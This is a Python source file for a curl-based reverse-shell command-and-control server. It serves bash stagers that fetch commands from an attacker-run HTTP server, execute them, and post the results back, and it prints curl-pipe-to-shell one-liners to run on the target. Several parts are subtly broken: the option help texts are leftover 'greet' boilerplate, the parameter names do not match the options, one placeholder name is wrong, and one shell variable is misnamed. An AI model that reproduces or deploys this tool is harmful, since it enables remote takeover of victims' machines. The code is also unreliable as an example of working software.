#!/usr/bin/python
import os
import ssl
import time
import queue
import base64
import logging
import threading
import functools
from http.server import BaseHTTPRequestHandler, HTTPServer

import click
import coloredlogs

logger = logging.getLogger(__name__)

SHELLCODE_TEMPLATES = {
    'CURL_ONLY': """#!/usr/bin/env bash
RUNNING=1
COUNTER=0
while [[ $RUNNING == 1 ]]; do   
    CMD=$(curl -s "_SERVER_PROTOCOL_://_SERVER_IP_:_SERVER_PORT_/recv/" --raw --http0.9 2>/dev/null)
    if [[ ${CMD} != "" ]]; then
        if [[ ${CMDps} == "exit" ]]; then
            RUNNING=0
        else
            sleep 0.125
            DATA="$(bash -c "${CMD}" 2>&1 )"
            curl -s -d ${DATA} "_SERVER_PROTOCOL_://_SERVER_IP_:_SERVER_PORT_/reply/${COUNTER}/" --raw --http0.9 2>/dev/null
            COUNTER=$[$COUNTER +1]
        fi
    fi
done""",
    'CURL_BASE64': """#!/usr/bin/env bash
if [ "$(uname)" == "Darwin" ]; then
    BASE64="base64"        
elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
    BASE64="base64 -w0"
fi
RUNNING=1
COUNTER=0
while [[ $RUNNING == 1 ]]; do   
    CMD=$(curl -s "http://_SERVER_IP_:_SERVER_PORT_/b64recv/" --raw --http0.9 2>/dev/null)
    if [[ ${CMD} != "" ]]; then
        # echo "CMD = $CMD "
        if [[ ${CMDps} == "exit" ]]; then
            RUNNING=0
        else
            sleep 0.125
            # echo "http://{REV_IP}/reply/${COUNTER}/"
            DATA="$(bash -c "${CMD}" 2>&1 | ${BASE64} )"
            # echo " ${DATA} "
            curl -s -d ${DATA} "http://_SERVER_IP_:_SERVER_PORT_/b64reply/${COUNTER}/" --raw --http0.9 2>/dev/null
            COUNTER=$[$COUNTER +1]
        fi
    fi
done"""
}


def get_ip_addr() -> str:
    """Retrieve the current IP address. This will return the first tun/tap
    interface if availabe. Otherwise, it will return the first "normal"
    interface with no preference for wired/wireless."""
    import netifaces
    PROTO = netifaces.AF_INET
    ifaces = [
        iface
        for iface in netifaces.interfaces()
        if not iface.startswith("virbr")
           and not iface.startswith("lo")
           and not iface.startswith("docker")
    ]

    # look for a tun/tap interface
    for iface in ifaces:
        if iface.startswith("tun") or iface.startswith("tap"):
            addrs = netifaces.ifaddresses(iface)
            if PROTO not in addrs:
                continue
            for a in addrs[PROTO]:
                if "addr" in a:
                    return a["addr"]

    # Try again. We don't care what kind now
    for iface in ifaces:
        addrs = netifaces.ifaddresses(iface)
        if PROTO not in addrs:
            continue
        for a in addrs[PROTO]:
            if "addr" in a:
                return a["addr"]

    return ''


def base64_command_encode(cmd):
    # TODO: handle custom base64 path, add urlencode support
    b64cmd = base64.urlsafe_b64encode(cmd.strip().encode('utf-8')).decode('utf-8')
    revshell = f'echo {b64cmd}|/usr/bin/base64 -d|/bin/bash'
    logger.debug(f'b64cmd = {revshell}')
    return revshell


def prepare_shellcode(template, server, use_base64):
    server_protocol, server_ip, server_port = server

    shellcode = template. \
        replace('_SERVER_PROTO_', server_protocol). \
        replace('_SERVER_IP_', server_ip). \
        replace('_SERVER_PORT_', str(server_port))

    return base64_command_encode(shellcode) if use_base64 else shellcode


class ReqHandler(BaseHTTPRequestHandler):

    def __init__(self, server, cmd_queue, reply_queue, *args, **kwargs):
        self.server_protocol, self.server_ip, self.server_port = self.server = server
        self.cmd_queue, self.reply_queue = cmd_queue, reply_queue
        self.clients = {}
        super().__init__(*args, **kwargs)

    def do_POST(self):
        logger.debug(f'[*] Received HTTP POST from {self.address_string()} path: {self.path}')
        content_length = int(self.headers['Content-Length'])
        logger.debug('[*] content_length = %i' % content_length)

        post_data = self.rfile.read(content_length)
        logger.debug(post_data.decode('utf-8'))
        items = self.path.split('/')
        action = items[1]
        if action == 'shell':
            self.reply_queue.put((self.address_string(), self.path, post_data))

    def do_GET(self):
        client_address = self.address_string()
        logger.debug(f'[*] Received HTTP GET from {self.address_string()} path: {self.path}')
        if client_address not in self.clients:
            self.clients[client_address] = 0

        items = self.path.split('/')
        action = items[1]
        if action == 'shell':
            logger.info(f'[*] Sending stager to: {client_address}')
            self.send_reply(prepare_shellcode(SHELLCODE_TEMPLATES['CURL_ONLY'], self.server, False))

        elif action == 'b64shell':
            logger.info(f'[*] Sending base64 stager to: {client_address}')
            self.send_reply(prepare_shellcode(SHELLCODE_TEMPLATES['CURL_BASE64'], self.server, True))

        elif action == 'recv':
            cmd_item = self.cmd_queue.get()
            if cmd_item is not None:
                logger.debug(f'[*] Sending command {cmd_item}')
                self.send_reply(str(cmd_item))
                self.cmd_queue.task_done()

        elif action == 'b64recv':
            cmd_item = self.cmd_queue.get()
            if cmd_item is not None:
                logger.debug(f'[*] Sending command {cmd_item}')
                self.send_reply(str(base64.b64encode(cmd_item)))
                self.cmd_queue.task_done()
        else:
            self.send_reply('')

    def send_reply(self, data):
        logger.debug(data)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(data.encode('utf-8'))


def daemonize_function(func, value):
    """Run function with no args in the daemon thread"""
    if value:
        thread = threading.Thread(target=func, daemon=True)
        thread.start()
        return thread

    return func()


class CurlShellServer(object):

    def __init__(self, server_ip='0.0.0.0', server_port=8080, server_protocol='http'):
        self.server = (server_protocol, server_ip, server_port)
        self.server_protocol, self.server_ip, self.server_port = server_protocol, server_ip, server_port
        self.server, self.http_thread, self.reply_thread, self.shell_thread = None, None, None, None
        self.cmd_queue, self.reply_queue = queue.Queue(), queue.Queue()

    def shell_handler(self):
        """Shell commands handler"""
        while True:
            cmd = input('cmd >')
            if cmd.lower() == "exit":
                break

            self.cmd_queue.put(cmd)

    def reply_queue_handler(self):
        """Command execution replies handler"""
        while True:
            reply_item = self.reply_queue.get()
            if reply_item is None:
                time.sleep(1)
                continue

            (ip, path, post_data) = reply_item
            res = base64.b64decode(post_data).decode('utf-8')
            print(res)

    def run_web_server(self, daemonize=True, certfile=None):
        """Run HTTP(S) server"""
        logger.info(f'[+] Starting HTTP server @ {self.server_ip}:{self.server_port}')
        handler = functools.partial(ReqHandler, self.server, self.cmd_queue, self.reply_queue)
        self.server = HTTPServer((self.server_ip, self.server_port), handler)
        if certfile is not None and os.path.exists(certfile):
            logger.info(f'Using certificate: {certfile}')
            self.server.socket = ssl.wrap_socket(self.server.socket, certfile=certfile, server_side=True)

        self.http_thread = daemonize_function(self.server.serve_forever, daemonize)

    def run_reply_handler(self, daemonize=True):
        """Run command execution result handler"""
        self.reply_thread = daemonize_function(self.reply_queue_handler, daemonize)

    def run_shell_handler(self, daemonize=False):
        """Run shell commands handler"""
        self.shell_thread = daemonize_function(self.shell_handler, daemonize)

    def show_usage(self):
        """Show usage commands"""
        shellcode_cmd = \
            f'Use following commands on target side:\n' \
            f'curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/b64shell|base64 -d|sh\n' \
            f'Mac OS X:' \
            f'curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/b64shell|base64 -w0 -d|sh\n' \
            f'bash -c "$(curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/shell/)\n"' \
            f'Mac OS X:'\
            f'bash -c "$(curl -fsSL  {self.server_protocol}://{self.server_ip}:{self.server_port}/shell/)\n"' \

        print(shellcode_cmd)

    def run(self):
        """Run all"""
        self.show_usage()
        self.run_web_server()
        self.run_reply_handler()
        self.run_shell_handler()


@click.command()
@click.option('-i', '--ip', help='Number of greetings.')
@click.option('-p', '--port', default=8000, help='The person to greet.')
@click.option('-c', '--ssl', "use_ssl", help='Certificate (server.pem)')
def shcurl(ip, port, use_base64):
    """
    Simple program that greets NAME for a total of COUNT times.
    Use following command for certificate file generation:
    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
    """
    coloredlogs.install(level=logging.INFO, logger=logger)
    # ip = get_ip_addr() if ip is None?
    cs = CurlShellServer(ip, port, use_base64)
    cs.run()


if __name__ == "__main__":
    shcurl()
